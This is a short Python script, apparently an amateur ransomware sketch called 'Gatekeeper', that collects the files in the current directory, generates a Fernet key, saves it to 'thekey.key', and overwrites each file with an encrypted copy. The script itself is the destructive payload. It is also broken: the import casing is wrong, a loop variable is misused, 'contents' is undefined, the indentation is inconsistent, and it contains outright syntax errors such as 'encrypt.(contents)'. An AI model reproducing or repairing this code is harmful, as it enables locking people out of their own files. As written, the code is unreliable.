#!/usr/bin/env python3

import os
from cryptography.fernet import fernet

files = []

for file in os.listdir():
        if file == "Gatekeeper.py" or file == "thekey.key":
            continue
        if os.path.isfile(file):
            files.append(file)

print(file)

key = fernet.generate_key()

with open("thekey.key","wb") as thekeymaster:
        thekeymaster.write(key)


for files in files:
        with open(file,"rb") as thefile:
                content =thefile.read()
            contents_encrypted = fernet(key).encrypt.(contents)
            with open(file, "wb")as thefile;
                thefile.write(contents_encrypted)